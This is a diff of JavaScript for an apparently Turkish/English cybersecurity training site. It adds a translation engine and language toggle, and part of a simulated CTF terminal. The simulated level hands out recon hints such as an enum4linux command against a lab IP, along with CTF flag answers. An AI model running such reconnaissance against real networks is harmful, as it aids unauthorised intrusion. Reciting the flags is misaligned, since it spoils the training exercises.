@@ -22,8 +22,379 @@
         currentUser: null,
         activePage: 'page-dashboard',
         accessLogs: [],
-        simRunning: false
+        simRunning: false,
+        language: localStorage.getItem('lfl_lang') || 'tr'
     };
+
+    // ==========================================
+    // MULTI-LANGUAGE (i18n) ENGINE (TR / EN)
+    // ==========================================
+    const I18N = {
+        currentLang: localStorage.getItem('lfl_lang') || 'tr',
+        translations: {
+    "tr": {
+        "btn_skip_intro": "GİRİŞİ ATLA [ESC] &rarr;",
+        "nav_section_core": "TEMEL PLATFORM",
+        "nav_section_academy": "AKADEMİ &amp; EĞİTİM",
+        "nav_section_eval": "TEST &amp; DEĞERLENDİRME",
+        "nav_section_guide": "REHBER &amp; SÖZLÜK",
+        "nav_section_admin": "YÖNETİCİ &amp; DENETİM",
+        "nav_dashboard": "Komuta Merkezi",
+        "nav_cmd": "Komuta Merkezi",
+        "crumb_root": "LFL Platform",
+        "nav_academy": "Siber Akademi (Eğitim)",
+        "nav_commands": "Siber Kod Kütüphanesi",
+        "nav_terminal": "Kali Web Terminal",
+        "nav_quiz": "Siber Rol Testi",
+        "nav_ctf": "Siber CTF Arenası",
+        "nav_glossary": "Siber Kılavuz &amp; Sözlük",
+        "nav_logs": "Ziyaretçi &amp; Sistem Logları",
+        "badge_education": "EĞİTİM",
+        "badge_140_codes": "140+ KOD",
+        "badge_10_questions": "10 SORU",
+        "badge_6_levels": "10 SEVİYE",
+        "cluster_active": "NODE CLUSTER // AKTİF",
+        "cluster_sub": "ASP.NET Core &bull; EF SQLite &bull; HSTS",
+        "topbar_search": "Siber Komutları ve Terimleri Ara... (Ctrl+K)",
+        "topbar_search_title": "Siber Komutları ve Terimleri Ara (Ctrl+K)",
+        "topbar_dragon": "🐉 Kali Animasyonu",
+        "btn_signin": "Giriş",
+        "hero_badge": "CYBER COMMAND MATRIX // ZERO-TRUST ACTIVE",
+        "hero_sub": "Ofansif ve Defansif Siber Güvenlik Mimarisi • Canlı Operasyon Alanı",
+        "btn_hero_quiz": "🎯 Siber Rol Testini Çöz (10 Soru)",
+        "btn_hero_shield": "🛡️ Canlı Kalkan Testi",
+        "tab_sqli": "SQLi Savunması",
+        "tab_zerotrust": "Zero-Trust Kalkanı",
+        "tab_xss": "XSS Filtresi",
+        "tab_bruteforce": "Brute-Force Karantinası",
+        "status_defcon": "DEFCON SEVİYESİ",
+        "status_kernel": "KERNEL GÜVENLİK NOTU",
+        "status_kestrel": "KESTREL SUNUCU İMZASI",
+        "about_title": "Siber Güvenlikte Yeni Nesil Canlı Operasyon Sahası",
+        "about_lead": "Lost From Light (LFL); ofansif (Red Team) ve defansif (Blue Team) siber güvenlik operasyonlarını, endüstri standardı zırhlama pratiklerini ve modern yazılım mühendisliğini tek çatı altında buluşturan interaktif bir siber savunma üssüdür.",
+        "arch_title": "Endüstriyel Standartlarda Altyapı &amp; Savunma Mimarisi",
+        "arch_subtitle": "LFL Platformunda sıfır taviz ilkesiyle uygulanan modern web, veri ve güvenlik mühendisliği katmanları. (Kartların üzerine gelerek 3D derinliği test edebilirsiniz)",
+        "card1_tag": "BACKEND KERNEL",
+        "card1_title": "C# .NET 8 &amp; ASP.NET Core",
+        "card1_desc": "Asenkron request pipeline, yüksek verimli mikro-servis mimarisi ve gizlenmiş sunucu imzasıyla (Kestrel Banner Redaction) saldırgan keşiflerini felç eden güçlü sunucu altyapısı.",
+        "card2_tag": "ORM &amp; SQLi KALKANI",
+        "card2_title": "Entity Framework &amp; LINQ",
+        "card2_desc": "Tüm veritabanı sorguları dinamik string birleştirme yerine kesin parametrik LINQ ifadeleriyle bağlanır. SQL Injection atak vektörleri baypas edilemez güvenli literal parametrelere dönüştürülür.",
+        "card3_tag": "ZERO-TRUST MODELİ",
+        "card3_title": "Zero-Trust &amp; RBAC İzolasyonu",
+        "card3_desc": "\"Asla güvenme, her zaman doğrula\" kuralı. İç ağda bile her istek kimlik doğrulamasına ve mTLS şifrelemesine tabidir. Yetkisiz yatay geçiş (lateral movement) anında engellenir.",
+        "card4_tag": "SEC-HEADERS HARDENING",
+        "card4_title": "HSTS Preload &amp; Katı CSP",
+        "card4_desc": "Strict-Transport-Security (1 yıllık Preload), X-Frame-Options: DENY (Clickjacking kalkanı), nosniff ve CSP Whitelist ile tarayıcı seviyesinde tam zırhlama.",
+        "card5_tag": "TERMINAL ENGINE",
+        "card5_title": "143+ Kali Komut Motoru",
+        "card5_desc": "Nmap, Gobuster, Wireshark, Suricata, Hydra ve Mimikatz gibi endüstri standardı güvenlik araçlarını tarayıcıda sıfır gecikmeyle simüle eden yüksek etkileşimli Kali Web Terminali.",
+        "card6_tag": "FRONTEND MİMARİSİ",
+        "card6_title": "Vanilla JS &amp; Yerel Mimari",
+        "card6_desc": "Ağır harici kütüphaneler olmadan geliştirilen hafif frontend; fetch() veya CORS engellerine takılmadan dosya çift tıklandığında bile anında bellekten çalışan sıfır bağımlılıklı yapı.",
+        "tree_title": "Sıfırdan Başla ➔ Uzmanlaşma Patikası",
+        "tree_subtitle": "Hiçbir ön bilgiye gerek yok. Kökten başla, temelleri kavra; ardından ilgi duyduğun alana (Red, Blue, Purple) doğru dallanarak uzmanlaş.",
+        "tree_starter_btn": "🌱 Starter Patikasına Başla (18 Temel Oda)",
+        "tree_red_btn": "🔴 Red Team Patikasına Gir",
+        "tree_blue_btn": "🔵 Blue Team Patikasına Gir",
+        "tree_purple_btn": "🟣 Purple Team Patikasına Gir",
+        "tree_quiz_title": "Hangi patikadan başlaman gerektiğinden emin değil misin?",
+        "tree_quiz_desc": "10 gerçekçi kurumsal senaryo sorusunu yanıtla; güçlü ve zayıf yönlerini analiz edip sana özel siber güvenlik rolünü belirleyelim.",
+        "tree_quiz_btn": "Siber Rol Testini Başlat",
+        "tree_root_badge": "SEVİYE 0 // SIFIRDAN BAŞLAYANLAR İÇİN KÖK PATİKA",
+        "tree_root_title": "Starter Track // 18 Temel Eğitim ve Görev Odası",
+        "tree_root_desc": "Ağ mimarisi, IP/MAC, Portlar, DNS, TCP/UDP, HTTP, Linux dosya sistemi, CLI, chmod izinleri, Nmap, Hashing, Prosesler (ps/kill), grep log analizi, ss portları, tcpdump paketleri, Cookie &amp; Session, SSH anahtarları ve UFW güvenlik duvarı. Sıfır bilgiyle gel, tam donanımla ayrıl.",
+        "tree_red_badge": "🔴 OFANSİF OPERASYONLAR",
+        "tree_red_title": "Red Team (Saldırı &amp; Pentest)",
+        "tree_blue_badge": "🔵 DEFANSİF SAVUNMA",
+        "tree_blue_title": "Blue Team (SOC &amp; Tehdit Avı)",
+        "tree_purple_badge": "🟣 ENTEGRE STRATEJİ",
+        "tree_purple_title": "Purple Team (Tatbikat &amp; Tehdit Modelleme)",
+        "topbar_updates": "v4.2 Güncellemeleri",
+        "nav_changelog": "Güncelleme Günlüğü",
+        "changelog_title": "SİSTEM GÜNCELLEME GÜNLÜĞÜ",
+        "changelog_subtitle": "LFL Platform mimarisine eklenen tüm yeni modüller, güvenlik katmanları, oda genişletmeleri ve komut motoru kayıtları.",
+        "cl_stat_version": "Aktif Sürüm",
+        "cl_stat_rooms": "Toplam Görev",
+        "cl_stat_cli": "Terminal Motoru",
+        "cl_stat_lang": "Dil Desteği",
+        "cl_f_all": "Tümü",
+        "cl_f_feat": "✨ Özellikler",
+        "cl_f_sec": "🛡️ Güvenlik",
+        "cl_f_acad": "🎓 Akademi",
+        "cl_f_fix": "⚡ Düzeltmeler",
+        "cl_search_placeholder": "Güncellemelerde ara...",
+        "cl_btn_close": "Kapat [ESC]",
+        "logs_badge": "GÜVENLİK AUDİT &amp; TELEMETRİ",
+        "logs_main_heading": "Ziyaretçi &amp; İstemci Erişim Logları",
+        "logs_main_subheading": "Sisteme bağlanan gerçek istemcilerin IP adresi, işletim sistemi, tarayıcısı ve cihaz parmak izi",
+        "btn_export_logs": "Dışa Aktar",
+        "btn_refresh_logs": "Yenile",
+        "logs_stat_total": "TOPLAM ERİŞİM İSTEĞİ",
+        "logs_stat_ips": "BENZERSİZ IP ADRESİ",
+        "logs_stat_admins": "YÖNETİCİ ERİŞİMLERİ",
+        "logs_stat_status": "SİSTEM LOG DURUMU",
+        "logs_col_time": "Zaman",
+        "logs_col_ip": "İstemci IP Adresi",
+        "logs_col_os": "İşletim Sistemi",
+        "logs_col_browser": "Tarayıcı &amp; Cihaz",
+        "logs_col_user": "Kullanıcı / Rol",
+        "logs_col_action": "İşlem &amp; Rota",
+        "logs_col_status": "Durum",
+        "auth_title_signin": "Operatör Kimlik Doğrulama",
+        "auth_sub_signin": "Güvenli Erişim Ağ Geçidi &bull; JWT Bearer Token Yönetimi",
+        "auth_tab_signin": "Giriş Yap",
+        "auth_tab_signup": "Kayıt Ol",
+        "form_username_label": "Operatör Adı / Callsign",
+        "form_password_label": "Şifre / Güvenlik Anahtarı",
+        "form_confirm_password_label": "Şifre Doğrulama (Tekrar)",
+        "btn_auth_execute": "Giriş Yap &amp; Session Storage'a Kaydet &rarr;",
+        "ctf_tier_badge": "KADEMELİ SİBER OPERASYON // 10 SEVİYE &bull; 6000 XP",
+        "ctf_main_heading": "LFL Siber CTF Operasyon Sahası",
+        "ctf_main_sub": "Keşif (Recon), Web Sızma, Adli Bilişim (Forensics), Active Directory, SOC C2 Avı, Konteyner Kaçışı ve Kernel Zero-Day operasyonlarını adım adım tamamlayın.",
+        "ctf_btn_reset": "↺ Operasyonu Sıfırla",
+        "ctf_hud_target_lbl": "AKTİF HEDEF SİSTEM",
+        "ctf_hud_ops_lbl": "OPERASYON DURUMU",
+        "ctf_hud_timer_lbl": "OPERASYON SÜRESİ",
+        "ctf_hud_rank_lbl": "AKTİF SİBER RÜTBE",
+        "ctf_flt_all": "🌐 Tüm Seviyeler (10)",
+        "ctf_flt_recon": "🔍 Keşif &amp; Linux (1.1 - 1.2)",
+        "ctf_flt_red": "🔴 Red Team &amp; Web/AD (2.1, 3.1, 3.2, 4.1)",
+        "ctf_flt_blue": "🔵 Blue &amp; Purple Team (2.2, 4.2, 5.1)",
+        "ctf_flt_boss": "👑 Grand Final Boss (5.2)",
+        "ctf_btn_autostep": "⚡ Sıradaki Adımı Çalıştır",
+        "ctf_btn_clear": "Temizle",
+        "ctf_btn_restart": "Sıfırla",
+        "ctf_term_footer_tip": "💡 İpucu: <kbd>Tab</kbd> ile otomatik tamamla, <kbd>&uarr;</kbd><kbd>&darr;</kbd> ile geçmişte gezin, sol görev listesinden <strong style=\"color: var(--cyan);\">⚡ Çalıştır</strong>'a bas veya bayrağı yakalayınca <code style=\"color: var(--green);\">submit LFL{...}</code> yaz.",
+        "ctf_input_placeholder": "Kali komutunu yazın ve Enter'a basın (Tab: Otomatik Tamamla)..."
+    },
+    "en": {
+        "btn_skip_intro": "SKIP INTRO [ESC] &rarr;",
+        "nav_section_core": "CORE PLATFORM",
+        "nav_section_academy": "ACADEMY &amp; TRAINING",
+        "nav_section_eval": "TEST &amp; EVALUATION",
+        "nav_section_guide": "GUIDE &amp; GLOSSARY",
+        "nav_section_admin": "ADMIN &amp; AUDIT",
+        "nav_dashboard": "Command Center",
+        "nav_cmd": "Command Center",
+        "crumb_root": "LFL Platform",
+        "nav_academy": "Cyber Academy (Training)",
+        "nav_commands": "Cyber Code Library",
+        "nav_terminal": "Kali Web Terminal",
+        "nav_quiz": "Cyber Role Quiz",
+        "nav_ctf": "Cyber CTF Arena",
+        "nav_glossary": "Cyber Guide &amp; Glossary",
+        "nav_logs": "Visitor &amp; System Logs",
+        "badge_education": "TRAINING",
+        "badge_140_codes": "140+ CODES",
+        "badge_10_questions": "10 QUESTIONS",
+        "badge_6_levels": "10 LEVELS",
+        "cluster_active": "NODE CLUSTER // ACTIVE",
+        "cluster_sub": "ASP.NET Core &bull; EF SQLite &bull; HSTS",
+        "topbar_search": "Search Cyber Commands &amp; Terms... (Ctrl+K)",
+        "topbar_search_title": "Search Cyber Commands and Terms (Ctrl+K)",
+        "topbar_dragon": "🐉 Kali Animation",
+        "btn_signin": "Sign In",
+        "hero_badge": "CYBER COMMAND MATRIX // ZERO-TRUST ACTIVE",
+        "hero_sub": "Offensive & Defensive Cyber Security Architecture • Live Operations Range",
+        "btn_hero_quiz": "🎯 Take Cyber Role Quiz (10 Questions)",
+        "btn_hero_shield": "🛡️ Live Shield Test",
+        "tab_sqli": "SQLi Defense",
+        "tab_zerotrust": "Zero-Trust Shield",
+        "tab_xss": "XSS Filter",
+        "tab_bruteforce": "Brute-Force Quarantine",
+        "status_defcon": "DEFCON LEVEL",
+        "status_kernel": "DEFENSE KERNEL STATUS",
+        "status_kestrel": "KESTREL SERVER SIGNATURE",
+        "about_title": "Next-Gen Live Cyber Range &amp; Operations Field",
+        "about_lead": "Lost From Light (LFL) is an interactive cyber defense command center unifying offensive (Red Team) and defensive (Blue Team) operations, industry-standard hardening practices, and modern software engineering under one roof.",
+        "arch_title": "Industrial-Standard Infrastructure &amp; Defense Architecture",
+        "arch_subtitle": "Modern web, data, and security engineering layers built with zero-compromise principles on LFL. (Hover over cards to test 3D tilt depth)",
+        "card1_tag": "BACKEND KERNEL",
+        "card1_title": "C# .NET 8 &amp; ASP.NET Core",
+        "card1_desc": "High-performance async request pipeline, microservice architecture, and hidden server signature (Kestrel Banner Redaction) paralyzing attacker reconnaissance.",
+        "card2_tag": "ORM &amp; SQLi SHIELD",
+        "card2_title": "Entity Framework &amp; LINQ",
+        "card2_desc": "All database queries use strictly parameterized LINQ expressions instead of dynamic concatenation, converting SQL Injection attack vectors into non-bypassable literal parameters.",
+        "card3_tag": "ZERO-TRUST MODEL",
+        "card3_title": "Zero-Trust &amp; RBAC Isolation",
+        "card3_desc": "\"Never trust, always verify\" rule. Every internal request undergoes authentication and mTLS encryption; unauthorized lateral movement is instantly neutralized.",
+        "card4_tag": "SEC-HEADERS HARDENING",
+        "card4_title": "HSTS Preload &amp; Strict CSP",
+        "card4_desc": "Full browser-level hardening with Strict-Transport-Security (1-year Preload), X-Frame-Options: DENY (Clickjacking shield), nosniff, and strict CSP Whitelist.",
+        "card5_tag": "TERMINAL ENGINE",
+        "card5_title": "143+ Kali Command Engine",
+        "card5_desc": "High-interactivity Kali Web Terminal simulating industry-standard security tools like Nmap, Gobuster, Wireshark, Suricata, Hydra, and Mimikatz with zero latency in your browser.",
+        "card6_tag": "FRONTEND ARCHITECTURE",
+        "card6_title": "Vanilla JS &amp; Native Architecture",
+        "card6_desc": "Lightweight frontend built without heavy external libraries; a zero-dependency architecture that runs instantly from memory even when double-clicking files without CORS restrictions.",
+        "tree_title": "Start From Scratch ➔ Specialization Path",
+        "tree_subtitle": "No prior knowledge needed. Start from the roots, grasp fundamentals, then branch out into your preferred field (Red, Blue, Purple).",
+        "tree_starter_btn": "🌱 Start Starter Track (18 Core Rooms)",
+        "tree_red_btn": "🔴 Enter Red Team Track",
+        "tree_blue_btn": "🔵 Enter Blue Team Track",
+        "tree_purple_btn": "🟣 Enter Purple Team Track",
+        "tree_quiz_title": "Not sure which track you should start with?",
+        "tree_quiz_desc": "Answer 10 realistic corporate scenario questions; let us analyze your strengths and weaknesses to determine your specialized cyber security role.",
+        "tree_quiz_btn": "Start Cyber Role Quiz",
+        "tree_root_badge": "LEVEL 0 // ROOT TRACK FOR ABSOLUTE BEGINNERS",
+        "tree_root_title": "Starter Track // 18 Essential Training & Mission Rooms",
+        "tree_root_desc": "Network architecture, IP/MAC, Ports, DNS, TCP/UDP, HTTP, Linux filesystem, CLI, chmod permissions, Nmap, Hashing, Processes (ps/kill), grep log analysis, ss ports, tcpdump packets, Cookie &amp; Session, SSH keys, and UFW firewall. Arrive with zero knowledge, leave fully empowered.",
+        "tree_red_badge": "🔴 OFFENSIVE OPERATIONS",
+        "tree_red_title": "Red Team (Offense &amp; Pentesting)",
+        "tree_blue_badge": "🔵 DEFENSIVE OPERATIONS",
+        "tree_blue_title": "Blue Team (SOC &amp; Threat Hunting)",
+        "tree_purple_badge": "🟣 INTEGRATED STRATEGY",
+        "tree_purple_title": "Purple Team (Simulation &amp; Threat Modeling)",
+        "topbar_updates": "v4.2 Updates",
+        "nav_changelog": "Changelog & Releases",
+        "changelog_title": "SYSTEM CHANGELOG & RELEASES",
+        "changelog_subtitle": "Comprehensive release history of all modules, security shields, academy expansions, and CLI engines.",
+        "cl_stat_version": "Current Version",
+        "cl_stat_rooms": "Total Rooms",
+        "cl_stat_cli": "CLI Engine",
+        "cl_stat_lang": "Language Support",
+        "cl_f_all": "All",
+        "cl_f_feat": "✨ Features",
+        "cl_f_sec": "🛡️ Security",
+        "cl_f_acad": "🎓 Academy",
+        "cl_f_fix": "⚡ Fixes",
+        "cl_search_placeholder": "Search updates...",
+        "cl_btn_close": "Close [ESC]",
+        "logs_badge": "SECURITY AUDIT &amp; TELEMETRY",
+        "logs_main_heading": "Visitor &amp; Client Access Logs",
+        "logs_main_subheading": "Real-time client IP addresses, operating systems, browsers, and device fingerprints connected to the system",
+        "btn_export_logs": "Export",
+        "btn_refresh_logs": "Refresh",
+        "logs_stat_total": "TOTAL ACCESS REQUESTS",
+        "logs_stat_ips": "UNIQUE IP ADDRESSES",
+        "logs_stat_admins": "ADMIN ACCESSES",
+        "logs_stat_status": "SYSTEM LOG STATUS",
+        "logs_col_time": "Time",
+        "logs_col_ip": "Client IP Address",
+        "logs_col_os": "Operating System",
+        "logs_col_browser": "Browser &amp; Device",
+        "logs_col_user": "User / Role",
+        "logs_col_action": "Action &amp; Route",
+        "logs_col_status": "Status",
+        "auth_title_signin": "Operator Authentication",
+        "auth_sub_signin": "Secure Access Gateway &bull; JWT Bearer Token Management",
+        "auth_tab_signin": "Sign In",
+        "auth_tab_signup": "Sign Up",
+        "form_username_label": "Operator Name / Callsign",
+        "form_password_label": "Password / Security Key",
+        "form_confirm_password_label": "Confirm Password (Repeat)",
+        "btn_auth_execute": "Sign In &amp; Save to Session Storage &rarr;",
+        "ctf_tier_badge": "TIERED CYBER OPERATIONS // 10 LEVELS &bull; 6000 XP",
+        "ctf_main_heading": "LFL Cyber CTF Operations Range",
+        "ctf_main_sub": "Complete Reconnaissance, Web Exploitation, Digital Forensics, Active Directory, SOC C2 Threat Hunting, Container Escape, and Kernel Zero-Day operations step by step.",
+        "ctf_btn_reset": "↺ Reset Operation",
+        "ctf_hud_target_lbl": "ACTIVE TARGET SYSTEM",
+        "ctf_hud_ops_lbl": "OPERATION STATUS",
+        "ctf_hud_timer_lbl": "OPERATION TIMER",
+        "ctf_hud_rank_lbl": "ACTIVE CYBER RANK",
+        "ctf_flt_all": "🌐 All Levels (10)",
+        "ctf_flt_recon": "🔍 Recon &amp; Linux (1.1 - 1.2)",
+        "ctf_flt_red": "🔴 Red Team &amp; Web/AD (2.1, 3.1, 3.2, 4.1)",
+        "ctf_flt_blue": "🔵 Blue &amp; Purple Team (2.2, 4.2, 5.1)",
+        "ctf_flt_boss": "👑 Grand Final Boss (5.2)",
+        "ctf_btn_autostep": "⚡ Run Next Step",
+        "ctf_btn_clear": "Clear",
+        "ctf_btn_restart": "Reset",
+        "ctf_term_footer_tip": "💡 Tip: Auto-complete with <kbd>Tab</kbd>, browse history with <kbd>&uarr;</kbd><kbd>&darr;</kbd>, click <strong style=\"color: var(--cyan);\">⚡ Run</strong> on mission steps, or type <code style=\"color: var(--green);\">submit LFL{...}</code>.",
+        "ctf_input_placeholder": "Type Kali command and press Enter (Tab: Auto-Complete)..."
+    }
+},
+        setLanguage(lang, notify = false) {
+            if (lang !== 'tr' && lang !== 'en') lang = 'tr';
+            this.currentLang = lang;
+            state.language = lang;
+            try { localStorage.setItem('lfl_lang', lang); } catch(e) {}
+            document.documentElement.lang = lang;
+
+            // Update topbar button visual
+            const label = document.getElementById('current-lang-label');
+            if (label) {
+                // If current language is TR, button offers EN; if EN, button offers TR
+                label.textContent = lang === 'tr' ? 'EN' : 'TR';
+            }
+            const btn = document.getElementById('btn-language-toggle');
+            if (btn) {
+                btn.title = lang === 'tr' ? 'Switch to English (EN)' : "Türkçe'ye Geç (TR)";
+                btn.classList.toggle('active-en', lang === 'en');
+            }
+
+            // Apply all data-i18n elements
+            const dict = this.translations[lang] || this.translations['tr'];
+            document.querySelectorAll('[data-i18n]').forEach(el => {
+                const key = el.dataset.i18n;
+                if (dict[key] !== undefined) {
+                    el.innerHTML = dict[key];
+                }
+            });
+
+            // Apply placeholders
+            document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
+                const key = el.dataset.i18nPlaceholder;
+                if (dict[key] !== undefined) {
+                    el.placeholder = dict[key];
+                }
+            });
+
+            // Apply titles/tooltips
+            document.querySelectorAll('[data-i18n-title]').forEach(el => {
+                const key = el.dataset.i18nTitle;
+                if (dict[key] !== undefined) {
+                    el.title = dict[key];
+                }
+            });
+
+            // Update current active breadcrumb
+            const crumbTitle = document.getElementById('current-crumb-title');
+            if (crumbTitle && state.activePage) {
+                const titles = lang === 'en' ? {
+                    'page-dashboard': 'Command Center',
+                    'page-academy': 'Cyber Academy',
+                    'page-commands': 'Cyber Code Library',
+                    'page-terminal': 'Kali Web Terminal',
+                    'page-quiz': 'Cyber Role Quiz',
+                    'page-glossary': 'Cyber Guide & Glossary',
+                    'page-ctf': 'Cyber CTF Arena',
+                    'page-logs': 'Visitor & System Logs'
+                } : {
+                    'page-dashboard': 'Komuta Merkezi',
+                    'page-academy': 'Siber Akademi (Eğitim Planı)',
+                    'page-commands': 'Siber Kod Kütüphanesi',
+                    'page-terminal': 'Kali Web Terminal',
+                    'page-quiz': 'Siber Rol Testi',
+                    'page-glossary': 'Siber Kılavuz & Sözlük',
+                    'page-ctf': 'Siber CTF Arenası',
+                    'page-logs': 'Ziyaretçi & Sistem Logları'
+                };
+                crumbTitle.textContent = titles[state.activePage] || 'LFL Platform';
+            }
+
+            if (notify && typeof showToast === 'function') {
+                showToast('info', lang === 'en' ? '🌐 Language: English' : '🌐 Dil: Türkçe', lang === 'en' ? 'Interface switched to English.' : 'Arayüz dili Türkçe olarak güncellendi.');
+            }
+
+            // Fire event for any listening components (e.g. Quiz)
+            window.dispatchEvent(new CustomEvent('languageChanged', { detail: { lang } }));
+        },
+        lastToggleTime: 0,
+        toggle() {
+            const now = Date.now();
+            if (now - this.lastToggleTime < 300) return;
+            this.lastToggleTime = now;
+            const targetLang = (this.currentLang === 'tr') ? 'en' : 'tr';
+            this.setLanguage(targetLang, true);
+        }
+    };
+
+    // Expose globally
+    window.I18N = I18N;
+    window.toggleLanguage = () => I18N.toggle();
+
 
     let generateTerminalResponse = null;
 
@@ -534,12 +905,11 @@
         const replayBtn = document.getElementById('btn-replay-intro');
 
         const kernelBootSteps = [
-            { pct: 10, msg: "[0.000000] Linux version 6.8.11-kali-amd64 (devel@kali.org) #1 SMP PREEMPT_DYNAMIC" },
-            { pct: 25, msg: "[0.840210] lfl-core: Enforcing Zero-Trust Defense & Strict HSTS (31536000s)" },
-            { pct: 45, msg: "[1.820180] lfl-shield: Katman-7 WAF & Anti-Brute-Force Shield active [ARMED]" },
-            { pct: 65, msg: "[2.920490] lfl-auth: HMAC-SHA256 Token & Telemetry Engine initialized" },
-            { pct: 85, msg: "[3.980120] kali-terminal: Initializing Multi-Tab Sandbox with 142+ cyber tools..." },
-            { pct: 100, msg: "[4.920440] lfl-radar: Defense radar telemetry locked - DEFCON 4 STABLE" }
+            { pct: 10, msg: "[10%] İstemci taraflı JavaScript siber simülasyon motoru başlatılıyor..." },
+            { pct: 35, msg: "[35%] Starter Track (18 Temel Eğitim Odası) müfredatı yükleniyor..." },
+            { pct: 65, msg: "[65%] Red • Blue • Purple Team uzmanlaşma dalları hazırlanıyor..." },
+            { pct: 85, msg: "[85%] 143+ Kali Web Terminal aracı ve CTF Arenası belleğe alınıyor..." },
+            { pct: 100, msg: "[100%] LFL Siber Eğitim Platformu hazır — Kurulum gerektirmeden başla!" }
         ];
 
         let animationFrame = null;
@@ -567,7 +937,7 @@
             splash.style.display = 'flex';
             splash.classList.remove('fade-out');
             if (progressBar) progressBar.style.width = '0%';
-            if (cliText) cliText.textContent = "modprobe --force-vermagic lfl_kernel_shield.ko";
+            if (cliText) cliText.textContent = "Siber eğitim odaları ve interaktif terminal motoru hazırlanıyor...";
 
             const duration = 3200; // 5 saniye sinematik Kali Linux Dragon intro
             const startTime = performance.now();
@@ -717,7 +1087,17 @@
         // Update breadcrumb
         const crumbTitle = document.getElementById('current-crumb-title');
         if (crumbTitle) {
-            const titles = {
+            const isEn = (window.I18N && window.I18N.currentLang === 'en');
+            const titles = isEn ? {
+                'page-dashboard': 'Command Center',
+                'page-academy': 'Cyber Academy',
+                'page-commands': 'Cyber Code Library',
+                'page-terminal': 'Kali Web Terminal',
+                'page-quiz': 'Cyber Role Quiz',
+                'page-glossary': 'Cyber Guide & Glossary',
+                'page-ctf': 'Cyber CTF Arena',
+                'page-logs': 'Visitor & System Logs'
+            } : {
                 'page-dashboard': 'Komuta Merkezi',
                 'page-academy': 'Siber Akademi (Eğitim Planı)',
                 'page-commands': 'Siber Kod Kütüphanesi',
@@ -727,7 +1107,7 @@
                 'page-ctf': 'Siber CTF Arenası',
                 'page-logs': 'Ziyaretçi & Sistem Logları'
             };
-            crumbTitle.textContent = titles[pageId] || 'LFL Platform';
+            crumbTitle.textContent = titles[pageId] || (isEn ? 'LFL Platform' : 'LFL Platform');
         }
 
         // Telemetry ping
@@ -847,6 +1227,17 @@
         const btnIntroQuiz = document.getElementById('btn-intro-to-quiz') || document.getElementById('btn-intro-to-academy');
         if (btnIntroQuiz) {
             btnIntroQuiz.addEventListener('click', () => navigateToPage('page-quiz'));
+        }
+
+        const btnLanguageToggle = document.getElementById('btn-language-toggle');
+        if (btnLanguageToggle) {
+            btnLanguageToggle.onclick = (e) => {
+                if (e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                }
+                I18N.toggle();
+            };
         }
 
         const btnHeroRoleQuiz = document.getElementById('btn-hero-role-quiz');
@@ -1086,6 +1477,43 @@
             const activeTab = getActiveTab();
             activeTab.cmdHistory.push(trimmed);
             activeTab.historyCursor = activeTab.cmdHistory.length;
+
+            if (trimmed.toLowerCase() === 'updates' || trimmed.toLowerCase() === 'changelog') {
+                const isEn = (window.I18N && window.I18N.currentLang === 'en');
+                const outHtml = isEn ?
+                    `<span style="color:#00e5ff; font-weight:700;">[ LFL PLATFORM CHANGELOG // RECENT RELEASES ]</span><br/>` +
+                    `<span style="color:#94a3b8;">* Active Version: </span><span style="color:#10b981; font-weight:700;">v4.1 [LIVE &amp; STABLE]</span><br/>` +
+                    `<span style="color:#94a3b8;">* Release Date: November 10, 2026</span><br/>` +
+                    `<span style="color:#94a3b8;">* 101 Bilingual Components, 69 Academy Rooms, 143+ Tools.</span><br/>` +
+                    `<span style="color:#c084fc;">Opening comprehensive graphical Changelog modal on screen...</span>` :
+                    `<span style="color:#00e5ff; font-weight:700;">[ LFL PLATFORM CHANGELOG // SİSTEM GÜNCELLEME GÜNLÜĞÜ ]</span><br/>` +
+                    `<span style="color:#94a3b8;">* Aktif Sürüm: </span><span style="color:#10b981; font-weight:700;">v4.1 [CANLI &amp; AKTİF]</span><br/>` +
+                    `<span style="color:#94a3b8;">* Son Güncelleme: 10 Kasım 2026</span><br/>` +
+                    `<span style="color:#94a3b8;">* 101 İki Dilli Bileşen, 69 Görev Odası, 143+ Kali Komut Motoru.</span><br/>` +
+                    `<span style="color:#c084fc;">Detaylı grafiksel Güncelleme Günlüğü penceresi ekranda açılıyor...</span>`;
+                
+                const cmdRow = document.createElement('div');
+                cmdRow.className = 'kali-history-cmd';
+                cmdRow.innerHTML = `
+                    <div class="kali-prompt-line1">┌──(<span class="kali-user">Sunny</span><span class="kali-skull">㉿</span><span class="kali-host">SUNNY</span>)-[<span class="kali-path">~</span>]</div>
+                    <div class="kali-input-row"><span class="kali-prompt-line2">└─$</span><span class="kali-executed-text">${escapeHtml(trimmed)}</span></div>
+                `;
+                historyZone.appendChild(cmdRow);
+
+                const outputBox = document.createElement('div');
+                outputBox.className = 'kali-output-block';
+                outputBox.innerHTML = outHtml;
+                historyZone.appendChild(outputBox);
+                activeTab.historyHtml = historyZone.innerHTML;
+                terminalBody.scrollTop = terminalBody.scrollHeight;
+
+                setTimeout(() => {
+                    if (window.LFL_CHANGELOG && typeof window.LFL_CHANGELOG.open === 'function') {
+                        window.LFL_CHANGELOG.open();
+                    }
+                }, 350);
+                return;
+            }
 
             if (trimmed.toLowerCase() === 'clear') {
                 historyZone.innerHTML = '';
@@ -1596,6 +2024,56 @@ Table: master_classified_flags
 <code style="color: #00e5ff; font-size: 13px; font-weight: 800;">submit LFL{level3_2_sqli_grand_master_champion_2026}</code>
 </pre>
                 `;
+            }
+
+            // CTF Seviye 4.1 (Active Directory & Kerberoasting)
+            if (cleanCliCmd.includes('10.10.4.10') && cleanCliCmd.includes('nmap')) {
+                return `<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px;">PORT    STATE SERVICE      VERSION\n88/tcp  open  kerberos-sec Microsoft Windows Kerberos\n389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: lfl.corp)\n445/tcp open  microsoft-ds Windows Server 2022 Standard 20348\n<span style="color: #38bdf8; font-weight: bold;">[+] CTF [Seviye 4.1]: Domain Controller (lfl.corp) aktif! SMB paylaşımlarını tarayın: enum4linux -a 10.10.4.10</span></pre>`;
+            }
+            if (cleanCliCmd.includes('enum4linux') && cleanCliCmd.includes('10.10.4.10')) {
